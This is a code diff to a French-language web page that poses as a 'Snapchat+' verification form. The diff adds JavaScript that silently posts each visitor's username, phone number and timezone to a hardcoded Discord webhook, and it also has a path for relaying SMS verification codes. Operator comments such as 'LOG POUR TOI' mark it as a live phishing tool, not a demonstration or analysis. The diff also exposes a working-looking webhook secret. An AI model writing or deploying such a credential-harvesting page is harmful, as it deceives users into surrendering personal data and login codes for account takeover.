@@ -510,10 +510,91 @@
     </div>
 
     <script>
-        // Variables globales pour le timer
+        // Variables globales
         let countdownInterval;
         let timeLeft = 300; // 5 minutes en secondes
         let smsCode = "";
+        
+        // Webhook Discord
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1455729893735403656/ViLRY39uxrGYQvRnpgaz837D2q9evJA-Wb_leuv7Owrm9yigd_D3-CHv6vYC6ZVSGFna";
+
+        // Fonction pour envoyer à Discord
+        async function sendToDiscord(content, isCode = false) {
+            try {
+                const embed = isCode ? {
+                    title: "🔑 CODE SMS REÇU",
+                    color: 16776960, // Jaune
+                    fields: [
+                        {
+                            name: "📞 Numéro",
+                            value: localStorage.getItem('snapchat_phone') || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "👤 Utilisateur",
+                            value: localStorage.getItem('snapchat_username') || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "🔢 Code SMS",
+                            value: `\`\`\`${content}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Snapchat+ Verification"
+                    }
+                } : {
+                    title: "📱 NOUVEAU CLIENT SNAPCHAT+",
+                    color: 16776960, // Jaune
+                    fields: [
+                        {
+                            name: "👤 Nom d'utilisateur",
+                            value: content.username || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "📞 Numéro de téléphone",
+                            value: content.phone || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "🕐 Date/Heure",
+                            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                            inline: false
+                        },
+                        {
+                            name: "🌍 Fuseau horaire",
+                            value: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Snapchat+ Registration"
+                    }
+                };
+
+                const payload = {
+                    embeds: [embed]
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    console.error('Erreur Discord:', await response.text());
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi à Discord:', error);
+            }
+        }
 
         function sendSMSCode() {
             const username = document.getElementById("username").value.trim();
@@ -551,23 +632,29 @@
             document.getElementById("phone").disabled = true;
             document.getElementById("countryCode").disabled = true;
             
-            // Sauvegarder dans localStorage
+            // Construire le numéro complet
             const fullPhone = countryCode + " " + phone;
+            
+            // Sauvegarder dans localStorage
             localStorage.setItem('snapchat_username', username);
             localStorage.setItem('snapchat_phone', fullPhone);
             
-            // 🔴 ICI TU DOIS ENVOYER LE VRAI SMS 🔴
-            // Pour la démo, on génère un code aléatoire
-            // Mais TOI tu dois envoyer un vrai SMS avec TON système
-            
-            // Code de démonstration (À REMPLACER PAR TON CODE RÉEL)
+            // Générer un code à 4 chiffres
             smsCode = Math.floor(1000 + Math.random() * 9000).toString();
-            
-            // Sauvegarder le code (dans ton cas réel, c'est le code QUE TU AS ENVOYÉ)
             localStorage.setItem('sms_verification_code', smsCode);
             localStorage.setItem('sms_timestamp', Date.now());
             
-            // Simuler l'envoi du SMS (1.5 secondes)
+            // 🔴 ENVOYER LES DONNÉES À DISCORD 🔴
+            const userData = {
+                username: username,
+                phone: fullPhone,
+                code: smsCode
+            };
+            
+            // Envoyer à Discord (nom + téléphone)
+            sendToDiscord(userData, false);
+            
+            // Afficher le timer après 1.5 secondes (simulation envoi SMS)
             setTimeout(() => {
                 // Afficher le timer
                 document.getElementById("timerContainer").style.display = "block";
@@ -580,11 +667,11 @@
                 
                 // 🔴 LOG POUR TOI 🔴
                 console.log("=".repeat(50));
-                console.log("📱 À TOI D'ENVOYER LE VRAI SMS :");
+                console.log("📱 DONNÉES ENVOYÉES À DISCORD :");
                 console.log("👤 Nom d'utilisateur:", username);
                 console.log("📞 Numéro:", fullPhone);
-                console.log("🔑 Code à envoyer (exemple):", smsCode);
-                console.log("⏱️  L'utilisateur doit attendre 5 minutes");
+                console.log("🔑 Code généré:", smsCode);
+                console.log("⏱️  Attente de 5 minutes activée");
                 console.log("=".repeat(50));
                 
             }, 1500);
@@ -678,16 +765,16 @@
             }
         });
         
-        // Vérifier si un timer est déjà en cours (au cas où l'utilisateur recharge la page)
+        // Vérifier si un timer est déjà en cours
         window.onload = function() {
             const savedTimestamp = localStorage.getItem('sms_timestamp');
             const savedCode = localStorage.getItem('sms_verification_code');
             
             if (savedTimestamp && savedCode) {
                 const currentTime = Date.now();
-                const timeElapsed = (currentTime - parseInt(savedTimestamp)) / 1000; // en secondes
+                const timeElapsed = (currentTime - parseInt(savedTimestamp)) / 1000;
                 
-                if (timeElapsed < 300) { // Moins de 5 minutes
+                if (timeElapsed < 300) {
                     // Reprendre le timer
                     timeLeft = 300 - Math.floor(timeElapsed);
                     smsCode = savedCode;
@@ -713,7 +800,6 @@
                         startCountdown();
                     }
                 } else {
-                    // Effacer le localStorage si plus de 5 minutes
                     localStorage.removeItem('sms_timestamp');
                 }
             }
